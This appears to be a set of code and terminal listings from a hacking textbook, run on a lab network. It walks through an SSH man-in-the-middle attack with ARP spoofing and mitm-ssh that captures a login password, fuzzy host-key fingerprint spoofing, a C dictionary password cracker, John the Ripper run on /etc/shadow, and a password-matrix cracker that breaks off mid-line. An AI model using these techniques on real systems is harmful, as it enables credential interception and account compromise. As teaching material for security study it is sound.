["```\nfor(i = 1 to n) {\n   Do something;\n   Do another thing;\n} \nDo one last thing;\n```", "```\nfor(x = 1 to n) {\n   for(y = 1 to n) {\n      Do the new action;\n   }\n}\nfor(i = 1 to n) {\n   Do something;\n   Do another thing;\n} \nDo one last thing;\n```", "```\nreader@hacking:~ $ sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT\n --to-ports 2222\nreader@hacking:~ $ sudo iptables -t nat -L\nChain PREROUTING (policy ACCEPT)\ntarget     prot opt source               destination         \nREDIRECT   tcp  --  anywhere             anywhere            tcp dpt:ssh redir ports 2222\n\nChain POSTROUTING (policy ACCEPT)\ntarget     prot opt source               destination         \n\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination         \nreader@hacking:~ $ mitm-ssh\n\n ..  \n/|\\    SSH Man In The Middle [Based on OpenSSH_3.9p1]\n_|_    By CMN <cmn@darklab.org>\n\nUsage: mitm-ssh <non-nat-route> [option(s)]\n\nRoutes:\n\n  <host>[:<port>]  - Static route to port on host\n                    (for non NAT connections)\nOptions:\n  -v             - Verbose output\n  -n             - Do not attempt to resolve hostnames\n  -d             - Debug, repeat to increase verbosity\n  -p port        - Port to listen for connections on\n  -f configfile  - Configuration file to read\n\nLog Options:\n  -c logdir      - Log data from client in directory\n  -s logdir      - Log data from server in directory\n  -o file        - Log passwords to file\n\nreader@hacking:~ $ mitm-ssh 192.168.42.72 -v -n -p 2222\nUsing static route to 192.168.42.72:22\nSSH MITM Server listening on 0.0.0.0 port 2222.\nGenerating 768 bit RSA key.\nRSA key generation complete.\n```", "```\nreader@hacking:~ $ arpspoof\nVersion: 2.3\nUsage: arpspoof [-i interface] [-t target] host\nreader@hacking:~ $ sudo arpspoof -i eth0 192.168.42.72\n0:12:3f:7:39:9c ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.42.72 is-at 0:12:3f:7:39:9c\n0:12:3f:7:39:9c ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.42.72 is-at 0:12:3f:7:39:9c \n0:12:3f:7:39:9c ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.42.72 is-at 0:12:3f:7:39:9c\n```", "```\niz@tetsuo:~ $ ssh jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is 84:7a:71:58:0f:b5:5e:1b:17:d7:b5:9c:81:5a:56:7c.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '192.168.42.72' (RSA) to the list of known hosts.\njose@192.168.42.72's password: \nLast login: Mon Oct  1 06:32:37 2007 from 192.168.42.72\nLinux loki 2.6.20-16-generic #2 SMP Thu Jun 7 20:19:32 UTC 2007 i686\n\njose@loki:~ $ ls -a\n.  ..  .bash_logout  .bash_profile  .bashrc  .bashrc.swp  .profile  Examples\njose@loki:~ $ id\nuid=1001(jose) gid=1001(jose) groups=1001(jose)\njose@loki:~ $ exit\nlogout\n\nConnection to 192.168.42.72 closed. \n\niz@tetsuo:~ $\n```", "```\nreader@hacking:~ $ sudo mitm-ssh 192.168.42.72 -v -n -p 2222\nUsing static route to 192.168.42.72:22\nSSH MITM Server listening on 0.0.0.0 port 2222.\nGenerating 768 bit RSA key.\nRSA key generation complete.\nWARNING: /usr/local/etc/moduli does not exist, using fixed modulus\n[MITM] Found real target 192.168.42.72:22 for NAT host 192.168.42.250:1929\n[MITM] Routing SSH2 192.168.42.250:1929 -> 192.168.42.72:22\n\n[2007-10-01 13:33:42] MITM (SSH2) 192.168.42.250:1929 -> 192.168.42.72:22\nSSH2_MSG_USERAUTH_REQUEST: jose ssh-connection password 0 sP#byp%srt\n\n[MITM] Connection from UNKNOWN:1929 closed\nreader@hacking:~ $ ls /usr/local/var/log/mitm-ssh/\npasswd.log\nssh2 192.168.42.250:1929 <- 192.168.42.72:22\nssh2 192.168.42.250:1929 -> 192.168.42.72:22\nreader@hacking:~ $ cat /usr/local/var/log/mitm-ssh/passwd.log \n[2007-10-01 13:33:42] MITM (SSH2) 192.168.42.250:1929 -> 192.168.42.72:22\nSSH2_MSG_USERAUTH_REQUEST: jose ssh-connection password 0 sP#byp%srt\n\nreader@hacking:~ $ cat /usr/local/var/log/mitm-ssh/ssh2*\nLast login: Mon Oct  1 06:32:37 2007 from 192.168.42.72\nLinux loki 2.6.20-16-generic #2 SMP Thu Jun 7 20:19:32 UTC 2007 i686\njose@loki:~ $ ls -a\n.  ..  .bash_logout  .bash_profile  .bashrc  .bashrc.swp  .profile  Examples\njose@loki:~ $ id\nuid=1001(jose) gid=1001(jose) groups=1001(jose)\njose@loki:~ $ exit \nlogout\n```", "```\niz@tetsuo:~ $ ssh jose@192.168.42.72\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nIT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!\nSomeone could be eavesdropping on you right now (man-in-the-middle attack)!\nIt is also possible that the RSA host key has just been changed.\nThe fingerprint for the RSA key sent by the remote host is\n84:7a:71:58:0f:b5:5e:1b:17:d7:b5:9c:81:5a:56:7c.\nPlease contact your system administrator.\nAdd correct host key in /home/jon/.ssh/known_hosts to get rid of this message.\nOffending key in /home/jon/.ssh/known_hosts:1\nRSA host key for 192.168.42.72 has changed and you have requested strict checking.\nHost key verification failed. \niz@tetsuo:~ $\n```", "```\niz@tetsuo:~ $ ssh jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '192.168.42.72' (RSA) to the list of known hosts.\njose@192.168.42.72's password: <ctrl-c>\niz@tetsuo:~ $ grep 192.168.42.72 ~/.ssh/known_hosts \n192.168.42.72 ssh-rsa \nAAAAB3NzaC1yc2EAAAABIwAAAIEA8Xq6H28EOiCbQaFbIzPtMJSc316SH4aOijgkf7nZnH4LirNziH5upZmk4/\nJSdBXcQohiskFFeHadFViuB4xIURZeF3Z7OJtEi8aupf2pAnhSHF4rmMV1pwaSuNTahsBoKOKSaTUOW0RN/1t3G/\n52KTzjtKGacX4gTLNSc8fzfZU= \niz@tetsuo:~ $\n```", "```\niz@tetsuo:~ $ rm ~/.ssh/known_hosts \niz@tetsuo:~ $ ssh -1 jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA1 key fingerprint is e7:c4:81:fe:38:bc:a8:03:f9:79:cd:16:e9:8f:43:55.\nAre you sure you want to continue connecting (yes/no)? no\nHost key verification failed.\niz@tetsuo:~ $ ssh -2 jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.\nAre you sure you want to continue connecting (yes/no)? no\nHost key verification failed. \niz@tetsuo:~ $\n```", "```\niz@tetsuo:~ $ telnet 192.168.42.72 22\nTrying 192.168.42.72...\nConnected to 192.168.42.72.\nEscape character is '^]'.\n`SSH-1.99-OpenSSH_3.9p1`\n\nConnection closed by foreign host.\niz@tetsuo:~ $ telnet 192.168.42.1 22\nTrying 192.168.42.1...\nConnected to 192.168.42.1.\nEscape character is '^]'.\n`SSH-2.0-OpenSSH_4.3p2 Debian-8ubuntu1`\n\nConnection closed by foreign host.\niz@tetsuo:~ $\n```", "```\niz@tetsuo:~ $ telnet 192.168.42.72 22\nTrying 192.168.42.72...\nConnected to 192.168.42.72.\nEscape character is '^]'.\n`SSH-1.99-OpenSSH_3.9p1`\n\nConnection closed by foreign host.\niz@tetsuo:~ $ rm ~/.ssh/known_hosts \niz@tetsuo:~ $ ssh jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '192.168.42.72' (RSA) to the list of known hosts.\njose@192.168.42.72's password:  \n\niz@tetsuo:~ $\n```", "```\nreader@hacking:~ $ echo \"Protocol 1\" >> /usr/local/etc/mitm-ssh_config \nreader@hacking:~ $ tail /usr/local/etc/mitm-ssh_config \n# Where to store passwords\n#PasswdLogFile /var/log/mitm-ssh/passwd.log\n\n# Where to store data sent from client to server\n#ClientToServerLogDir /var/log/mitm-ssh\n\n# Where to store data sent from server to client\n#ServerToClientLogDir /var/log/mitm-ssh\n\n`Protocol 1`\nreader@hacking:~ $ mitm-ssh 192.168.42.72 -v -n -p 2222\nUsing static route to 192.168.42.72:22\nSSH MITM Server listening on 0.0.0.0 port 2222.\nGenerating 768 bit RSA key. \nRSA key generation complete.\n```", "```\niz@tetsuo:~ $ telnet 192.168.42.72 22\nTrying 192.168.42.72...\nConnected to 192.168.42.72.\nEscape character is '^]'.\n`SSH-1.5-OpenSSH_3.9p1`\n\nConnection closed by foreign host.\n```", "```\niz@tetsuo:~ $ ssh jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA1 key fingerprint is 45:f7:8d:ea:51:0f:25:db:5a:4b:9e:6a:d6:3c:d0:a6\\. \nAre you sure you want to continue connecting (yes/no)?\n```", "```\niz@tetsuo:~ $ ssh jose@192.168.42.72\nWARNING: RSA key found for host 192.168.42.72\nin /home/iz/.ssh/known_hosts:1\nRSA key fingerprint ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established\nbut keys of different type are already known for this host.\nRSA1 key fingerprint is 45:f7:8d:ea:51:0f:25:db:5a:4b:9e:6a:d6:3c:d0:a6\\. \nAre you sure you want to continue connecting (yes/no)?\n```", "```\nreader@hacking:~ $ ssh-keyscan -t rsa 192.168.42.72 > loki.hostkey\n# 192.168.42.72 SSH-1.99-OpenSSH_3.9p1\nreader@hacking:~ $ cat loki.hostkey \n192.168.42.72 ssh-rsa \nAAAAB3NzaC1yc2EAAAABIwAAAIEA8Xq6H28EOiCbQaFbIzPtMJSc316SH4aOijgkf7nZnH4LirNziH5upZmk4/\nJSdBXcQohiskFFeHadFViuB4xIURZeF3Z7OJtEi8aupf2pAnhSHF4rmMV1pwaSuNTahsBoKOKSaTUOW0RN/1t3G/\n52KTzjtKGacX4gTLNSc8fzfZU=\nreader@hacking:~ $ ssh-keygen -l -f loki.hostkey \n1024 ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0 192.168.42.72 \nreader@hacking:~ $\n```", "```\nreader@hacking:~ $ ffp\nUsage: ffp [Options]\nOptions:\n  -f type       Specify type of fingerprint to use [Default: md5]\n                Available: md5, sha1, ripemd\n  -t hash       Target fingerprint in byte blocks. \n                Colon-separated: 01:23:45:67... or as string 01234567...\n  -k type       Specify type of key to calculate [Default: rsa]\n                Available: rsa, dsa\n  -b bits       Number of bits in the keys to calculate [Default: 1024]\n  -K mode       Specify key calulation mode [Default: sloppy]\n                Available: sloppy, accurate\n  -m type       Specify type of fuzzy map to use [Default: gauss]\n                Available: gauss, cosine\n  -v variation  Variation to use for fuzzy map generation [Default: 7.3]\n  -y mean       Mean value to use for fuzzy map generation [Default: 0.14]\n  -l size       Size of list that contains best fingerprints [Default: 10]\n  -s filename   Filename of the state file [Default: /var/tmp/ffp.state]\n  -e            Extract SSH host key pairs from state file\n  -d directory  Directory to store generated ssh keys to [Default: /tmp]\n  -p period     Period to save state file and display state [Default: 60]\n  -V            Display version information\nNo state file /var/tmp/ffp.state present, specify a target hash.\nreader@hacking:~ $ ffp -f md5 -k rsa -b 1024 -t ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:\n10:59:a0\n---[Initializing]---------------------------------------------------------------\n Initializing Crunch Hash: Done\n   Initializing Fuzzy Map: Done\n Initializing Private Key: Done\n   Initializing Hash List: Done\n   Initializing FFP State: Done\n---[Fuzzy Map]------------------------------------------------------------------\n    Length: 32\n      Type: Inverse Gaussian Distribution\n       Sum: 15020328\n Fuzzy Map:  10.83% | 9.64% : 8.52% | 7.47% : 6.49% | 5.58% : 4.74% | 3.96% :\n             3.25% | 2.62% : 2.05% | 1.55% : 1.12% | 0.76% : 0.47% | 0.24% :\n             0.09% | 0.01% : 0.00% | 0.06% : 0.19% | 0.38% : 0.65% | 0.99% :\n             1.39% | 1.87% : 2.41% | 3.03% : 3.71% | 4.46% : 5.29% | 6.18% :\n\n---[Current Key]----------------------------------------------------------------\n               Key Algorithm: RSA (Rivest Shamir Adleman)\n        Key Bits / Size of n: 1024 Bits\n                Public key e: 0x10001\n Public Key Bits / Size of e: 17 Bits\n        Phi(n) and e r.prime: Yes\n             Generation Mode: Sloppy\n\n State File: /var/tmp/ffp.state\n Running...\n\n---[Current State]--------------------------------------------------------------\n Running:   0d 00h 00m 00s | Total:          0k hashs | Speed:      nan hashs/s \n--------------------------------------------------------------------------------\n Best Fuzzy Fingerprint from State File /var/tmp/ffp.state\n   Hash Algorithm: Message Digest 5 (MD5)\n      Digest Size: 16 Bytes / 128 Bits\n   Message Digest: 6a:06:f9:a6:cf:09:19:af:c3:9d:c5:b9:91:a4:8d:81\n    Target Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0\n    Fuzzy Quality: 25.652482%\n\n---[Current State]--------------------------------------------------------------\n Running:   0d 00h 01m 00s | Total:       7635k hashs | Speed:   127242 hashs/s \n--------------------------------------------------------------------------------\n Best Fuzzy Fingerprint from State File /var/tmp/ffp.state\n   Hash Algorithm: Message Digest 5 (MD5)\n      Digest Size: 16 Bytes / 128 Bits\n   Message Digest: ba:06:3a:8c:bc:73:24:64:5b:8a:6d:fa:a6:1c:09:80\n    Target Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0\n    Fuzzy Quality: 55.471931%\n\n---[Current State]--------------------------------------------------------------\n Running:   0d 00h 02m 00s | Total:      15370k hashs | Speed:   128082 hashs/s \n--------------------------------------------------------------------------------\n Best Fuzzy Fingerprint from State File /var/tmp/ffp.state\n   Hash Algorithm: Message Digest 5 (MD5)\n      Digest Size: 16 Bytes / 128 Bits\n   Message Digest: ba:06:3a:8c:bc:73:24:64:5b:8a:6d:fa:a6:1c:09:80\n    Target Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0\n    Fuzzy Quality: 55.471931%\n\n.:[ output trimmed ]:.\n---[Current State]--------------------------------------------------------------\nRunning: 1d 05h 06m 00s | Total: 13266446k hashs | Speed: 126637 hashs/s \n--------------------------------------------------------------------------------\nBest Fuzzy Fingerprint from State File /var/tmp/ffp.state\nHash Algorithm: Message Digest 5 (MD5)\nDigest Size: 16 Bytes / 128 Bits\nMessage Digest: ba:0d:7f:d2:64:76:b8:9c:f1:22:22:87:b0:26:59:50\nTarget Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0\nFuzzy Quality: 70.158321%\n\n--------------------------------------------------------------------------------\nExiting and saving state file /var/tmp/ffp.state \nreader@hacking:~ $\n```", "```\nreader@hacking:~ $ ffp -e -d /tmp\n---[Restoring]------------------------------------------------------------------\n   Reading FFP State File: Done\n    Restoring environment: Done\n Initializing Crunch Hash: Done\n--------------------------------------------------------------------------------\n Saving SSH host key pairs: [00] [01] [02] [03] [04] [05] [06] [07] [08] [09] \nreader@hacking:~ $ ls /tmp/ssh-rsa*\n/tmp/ssh-rsa00      /tmp/ssh-rsa02.pub  /tmp/ssh-rsa05      /tmp/ssh-rsa07.pub\n/tmp/ssh-rsa00.pub  /tmp/ssh-rsa03      /tmp/ssh-rsa05.pub  /tmp/ssh-rsa08\n/tmp/ssh-rsa01      /tmp/ssh-rsa03.pub  /tmp/ssh-rsa06      /tmp/ssh-rsa08.pub\n/tmp/ssh-rsa01.pub  /tmp/ssh-rsa04      /tmp/ssh-rsa06.pub  /tmp/ssh-rsa09\n/tmp/ssh-rsa02      /tmp/ssh-rsa04.pub  /tmp/ssh-rsa07      /tmp/ssh-rsa09.pub \nreader@hacking:~ $\n```", "```\nreader@hacking:~ $ for i in $(ls -1 /tmp/ssh-rsa*.pub)\n> do\n> ssh-keygen -l -f $i\n> done\n1024 ba:0d:7f:d2:64:76:b8:9c:f1:22:22:87:b0:26:59:50 /tmp/ssh-rsa00.pub\n1024 ba:06:7f:12:bd:8a:5b:5c:eb:dd:93:ec:ec:d3:89:a9 /tmp/ssh-rsa01.pub\n`1024 ba:06:7e:b2:64:13:cf:0f:a4:69:17:d0:60:62:69:a0 /tmp/ssh-rsa02.pub`\n1024 ba:06:49:d4:b9:d4:96:4b:93:e8:5d:00:bd:99:53:a0 /tmp/ssh-rsa03.pub\n1024 ba:06:7c:d2:15:a2:d3:0d:bf:f0:d4:5d:c6:10:22:90 /tmp/ssh-rsa04.pub\n1024 ba:06:3f:22:1b:44:7b:db:41:27:54:ac:4a:10:29:e0 /tmp/ssh-rsa05.pub\n1024 ba:06:78:dc:be:a6:43:15:eb:3f:ac:92:e5:8e:c9:50 /tmp/ssh-rsa06.pub\n1024 ba:06:7f:da:ae:61:58:aa:eb:55:d0:0c:f6:13:61:30 /tmp/ssh-rsa07.pub\n1024 ba:06:7d:e8:94:ad:eb:95:d2:c5:1e:6d:19:53:59:a0 /tmp/ssh-rsa08.pub\n1024 ba:06:74:a2:c2:8b:a4:92:e1:e1:75:f5:19:15:60:a0 /tmp/ssh-rsa09.pub\nreader@hacking:~ $ ssh-keygen -l -f ./loki.hostkey \n1024 ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0 192.168.42.72 \nreader@hacking:~ $\n```", "```\nreader@hacking:~ $ echo \"HostKey /tmp/ssh-rsa02\" > /usr/local/etc/mitm-ssh_config \nreader@hacking:~ $ mitm-ssh 192.168.42.72 -v -n -p 2222Using static route to 192.168.\n42.72:22\nDisabling protocol version 1\\. Could not load host key \nSSH MITM Server listening on 0.0.0.0 port 2222.\n```", "```\niz@tetsuo:~ $ ssh jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0\\. \nAre you sure you want to continue connecting (yes/no)?\n```", "```\niz@tetsuo:~ $ ssh jose@192.168.42.72\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is ba:06:7e:b2:64:13:cf:0f:a4:69:17:d0:60:62:69:a0\\. \nAre you sure you want to continue connecting (yes/no)?\n```", "```\nNAME\n       crypt - password and data encryption\n\nSYNOPSIS\n       #define _XOPEN_SOURCE\n       #include <unistd.h>\n\n       char *crypt(const char *key, const char *salt);\n\nDESCRIPTION\n       crypt()  is  the  password  encryption  function.  It is based on the Data\n       Encryption  Standard  algorithm  with  variations  intended  (among  other\n       things) to discourage use of hardware implementations of a key search.\n\n       key is a user's typed password.\n\n       salt  is  a  two-character string chosen from the set [a-zA-Z0-9./].  This \n       string is used to perturb the algorithm in one of 4096 different ways.\n```", "```\n#define _XOPEN_SOURCE\n#include <unistd.h>\n#include <stdio.h>\n\nint main(int argc, char *argv[]) {\n   if(argc < 2) { \n      printf(\"Usage: %s <plaintext password> <salt value>\\n\", argv[0]);\n      exit(1); \n   }\n   printf(\"password \\\"%s\\\" with salt \\\"%s\\\" \", argv[1], argv[2]);\n   printf(\"hashes to ==> %s\\n\", crypt(argv[1], argv[2])); \n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o crypt_test crypt_test.c \n/tmp/cccrSvYU.o: In function `main':\ncrypt_test.c:(.text+0x73): undefined reference to `crypt'\ncollect2: ld returned 1 exit status\nreader@hacking:~/booksrc $ gcc -o crypt_test crypt_test.c -l crypt\nreader@hacking:~/booksrc $ ./crypt_test testing je\npassword \"testing\" with salt \"je\" hashes to ==> jeLu9ckBgvgX.\nreader@hacking:~/booksrc $ ./crypt_test test je\npassword \"test\" with salt \"je\" hashes to ==> jeHEAX1m66RV.\nreader@hacking:~/booksrc $ ./crypt_test test xy\npassword \"test\" with salt \"xy\" hashes to ==> xyVSuHLjceD92 \nreader@hacking:~/booksrc $\n```", "```\n#define _XOPEN_SOURCE\n#include <unistd.h>\n#include <stdio.h>\n\n/* Barf a message and exit. */\nvoid barf(char *message, char *extra) {\n   printf(message, extra);\n   exit(1);\n}\n\n/* A dictionary attack example program */\nint main(int argc, char *argv[]) {\n   FILE *wordlist;\n   char *hash, word[30], salt[3];\n   if(argc < 2)\n      barf(\"Usage: %s <wordlist file> <password hash>\\n\", argv[0]);\n\n   strncpy(salt, argv[2], 2); // First 2 bytes of hash are the salt.\n   salt[2] = '\\0';  // terminate string\n\n   printf(\"Salt value is \\'%s\\'\\n\", salt);\n\n   if( (wordlist = fopen(argv[1], \"r\")) == NULL) // Open the wordlist.\n      barf(\"Fatal: couldn't open the file \\'%s\\'.\\n\", argv[1]);\n\n   while(fgets(word, 30, wordlist) != NULL) { // Read each word\n      word[strlen(word)-1] = '\\0'; // Remove the '\\n' byte at the end.\n      hash = crypt(word, salt); // Hash the word using the salt.\n      printf(\"trying word:   %-30s ==> %15s\\n\", word, hash);\n      if(strcmp(hash, argv[2]) == 0) { // If the hash matches\n         printf(\"The hash \\\"%s\\\" is from the \", argv[2]);\n         printf(\"plaintext password \\\"%s\\\".\\n\", word);\n         fclose(wordlist);\n         exit(0);\n      }\n   }\n   printf(\"Couldn't find the plaintext password in the supplied wordlist.\\n\");\n   fclose(wordlist); \n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o crypt_crack crypt_crack.c -lcrypt\nreader@hacking:~/booksrc $ ./crypt_crack /usr/share/dict/words jeHEAX1m66RV.\nSalt value is 'je'\ntrying word:                                  ==>   jesS3DmkteZYk\ntrying word:   A                              ==>   jeV7uK/S.y/KU\ntrying word:   A's                            ==>   jeEcn7sF7jwWU\ntrying word:   AOL                            ==>   jeSFGex8ANJDE\ntrying word:   AOL's                          ==>   jesSDhacNYUbc\ntrying word:   Aachen                         ==>   jeyQc3uB14q1E\ntrying word:   Aachen's                       ==>   je7AQSxfhvsyM\ntrying word:   Aaliyah                        ==>   je/vAqRJyOZvU\n\n.:[ output trimmed ]:.\n\ntrying word:   terse                          ==>   jelgEmNGLflJ2\ntrying word:   tersely                        ==>   jeYfo1aImUWqg\ntrying word:   terseness                      ==>   jedH11z6kkEaA\ntrying word:   terseness's                    ==>   jedH11z6kkEaA\ntrying word:   terser                         ==>   jeXptBe6psF3g\ntrying word:   tersest                        ==>   jenhzylhDIqBA\ntrying word:   tertiary                       ==>   jex6uKY9AJDto\ntrying word:   test                           ==>   jeHEAX1m66RV.\nThe hash \"jeHEAX1m66RV.\" is from the plaintext password \"test\". \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./crypt_test h4R% je\npassword \"h4R%\" with salt \"je\" hashes to ==> jeMqqfIfPNNTE\nreader@hacking:~/booksrc $ ./crypt_crack /usr/share/dict/words jeMqqfIfPNNTE\nSalt value is 'je'\ntrying word:                                  ==>   jesS3DmkteZYk\ntrying word:   A                              ==>   jeV7uK/S.y/KU\ntrying word:   A's                            ==>   jeEcn7sF7jwWU\ntrying word:   AOL                            ==>   jeSFGex8ANJDE\ntrying word:   AOL's                          ==>   jesSDhacNYUbc\ntrying word:   Aachen                         ==>   jeyQc3uB14q1E\ntrying word:   Aachen's                       ==>   je7AQSxfhvsyM\ntrying word:   Aaliyah                        ==>   je/vAqRJyOZvU\n\n.:[ output trimmed ]:.\n\ntrying word:   zooms                          ==>   je8A6DQ87wHHI\ntrying word:   zoos                           ==>   jePmCz9ZNPwKU\ntrying word:   zucchini                       ==>   jeqZ9LSWt.esI\ntrying word:   zucchini's                     ==>   jeqZ9LSWt.esI\ntrying word:   zucchinis                      ==>   jeqZ9LSWt.esI\ntrying word:   zwieback                       ==>   jezzR3b5zwlys\ntrying word:   zwieback's                     ==>   jezzR3b5zwlys\ntrying word:   zygote                         ==>   jei5HG7JrfLy6\ntrying word:   zygote's                       ==>   jej86M9AG0yj2\ntrying word:   zygotes                        ==>   jeWHQebUlxTmo \nCouldn't find the plaintext password in the supplied wordlist.\n```", "```\nreader@hacking:~/booksrc $ john\n\nJohn the Ripper  Version 1.6  Copyright (c) 1996-98 by Solar Designer\n\nUsage: john [OPTIONS] [PASSWORD-FILES]\n-single                   \"single crack\" mode\n-wordfile:FILE -stdin     wordlist mode, read words from FILE or stdin\n-rules                    enable rules for wordlist mode\n-incremental[:MODE]       incremental mode [using section MODE]\n-external:MODE            external mode or word filter\n-stdout[:LENGTH]          no cracking, just write words to stdout\n-restore[:FILE]           restore an interrupted session [from FILE]\n-session:FILE             set session file name to FILE\n-status[:FILE]            print status of a session [from FILE]\n-makechars:FILE           make a charset, FILE will be overwritten\n-show                     show cracked passwords\n-test                     perform a benchmark\n-users:[-]LOGIN|UID[,..]  load this (these) user(s) only\n-groups:[-]GID[,..]       load users of this (these) group(s) only\n-shells:[-]SHELL[,..]     load users with this (these) shell(s) only\n-salts:[-]COUNT           load salts with at least COUNT passwords only\n-format:NAME              force ciphertext format NAME (DES/BSDI/MD5/BF/AFS/LM)\n-savemem:LEVEL            enable memory saving, at LEVEL 1..3\nreader@hacking:~/booksrc $ sudo tail -3 /etc/shadow\nmatrix:$1$zCcRXVsm$GdpHxqC9epMrdQcayUx0//:13763:0:99999:7:::\njose:$1$pRS4.I8m$Zy5of8AtD800SeMgm.2Yg.:13786:0:99999:7:::\nreader:U6aMy0wojraho:13764:0:99999:7:::\nreader@hacking:~/booksrc $ sudo john /etc/shadow\nLoaded 2 passwords with 2 different salts (FreeBSD MD5 [32/32])\nguesses: 0  time: 0:00:00:01 0% (2)  c/s: 5522  trying: koko\nguesses: 0  time: 0:00:00:03 6% (2)  c/s: 5489  trying: exports\nguesses: 0  time: 0:00:00:05 10% (2)  c/s: 5561  trying: catcat\nguesses: 0  time: 0:00:00:09 20% (2)  c/s: 5514  trying: dilbert!\nguesses: 0  time: 0:00:00:10 22% (2)  c/s: 5513  trying: redrum3\ntesting7         (jose)\nguesses: 1  time: 0:00:00:14 44% (2)  c/s: 5539  trying: KnightKnight\nguesses: 1  time: 0:00:00:17 59% (2)  c/s: 5572  trying: Gofish! \nSession aborted\n```", "```\n/*********************************************************\\\n*  Password Probability Matrix   *    File: ppm_gen.c     *\n***********************************************************\n*                                                         *\n*  Author:        Jon Erickson <matrix@phiral.com>        *\n*  Organization:  Phiral Research Laboratories            *\n*                                                         *\n*  This is the generate program for the PPM proof of      *\n*  concept.  It generates a file called 4char.ppm, which  *\n*  contains information regarding all possible 4-         *\n*  character passwords salted with 'je'.  This file can   *\n*  be used to quickly crack passwords found within this   *\n*  keyspace with the corresponding ppm_crack.c program.   *\n*                                                         *\n\\*********************************************************/\n\n#define _XOPEN_SOURCE\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n\n#define HEIGHT 16384\n#define WIDTH  1129\n#define DEPTH  8\n#define SIZE HEIGHT * WIDTH * DEPTH\n\n/* Map a single hash byte to an enumerated value. */\nint enum_hashbyte(char a) {\n   int i, j;\n   i = (int)a;\n   if((i >= 46) && (i <= 57))\n      j = i - 46;\n   else if ((i >= 65) && (i <= 90))\n      j = i - 53;\n   else if ((i >= 97) && (i <= 122))\n      j = i - 59;\n   return j;\n}\n\n/* Map 3 hash bytes to an enumerated value. */\nint enum_hashtriplet(char a, char b, char c) {\n   return (((enum_hashbyte(c)%4)*4096)+(enum_hashbyte(a)*64)+enum_hashbyte(b));\n}\n/* Barf a message and exit. */\nvoid barf(char *message, char *extra) {\n   printf(message, extra);\n   exit(1);\n}\n\n/* Generate a 4-char.ppm file with all possible 4-char passwords (salted w/ je). */\nint main() {\n   char plain[5];\n   char *code, *data;\n   int i, j, k, l;\n   unsigned int charval, val;\n   FILE *handle;\n   if (!(handle = fopen(\"4char.ppm\", \"w\")))\n      barf(\"Error: Couldn't open file '4char.ppm' for writing.\\n\", NULL);\n\n   data = (char *) malloc(SIZE);\n   if (!(data))\n      barf(\"Error: Couldn't allocate memory.\\n\", NULL);\n\n   for(i=32; i<127; i++) {\n      for(j=32; j<127; j++) {\n         printf(\"Adding %c%c** to 4char.ppm..\\n\", i, j);\n         for(k=32; k<127; k++) {\n            for(l=32; l<127; l++) {\n\n               plain[0]  = (char)i; // Build every\n               plain[1]  = (char)j; // possible 4-byte\n               plain[2]  = (char)k; // password.\n               plain[3]  = (char)l;\n               plain[4]  = '\\0';\n               code = crypt((const char *)plain, (const char *)\"je\"); // Hash it.\n\n               /* Lossfully store statistical info about the pairings. */\n               val = enum_hashtriplet(code[2], code[3], code[4]); // Store info about\n bytes 2-4.\n\n               charval = (i-32)*95 + (j-32); // First 2 plaintext bytes\n               data[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));\n               val += (HEIGHT * 4);\n               charval = (k-32)*95 + (l-32); // Last 2 plaintext bytes\n               data[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));\n\n               val = HEIGHT + enum_hashtriplet(code[4], code[5], code[6]); // bytes 4-6\n               charval = (i-32)*95 + (j-32); // First 2 plaintext bytes\n               data[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));\n               val += (HEIGHT * 4);\n               charval = (k-32)*95 + (l-32); // Last 2 plaintext bytes\n               data[(val*WIDTH)+(charval/8)] |=  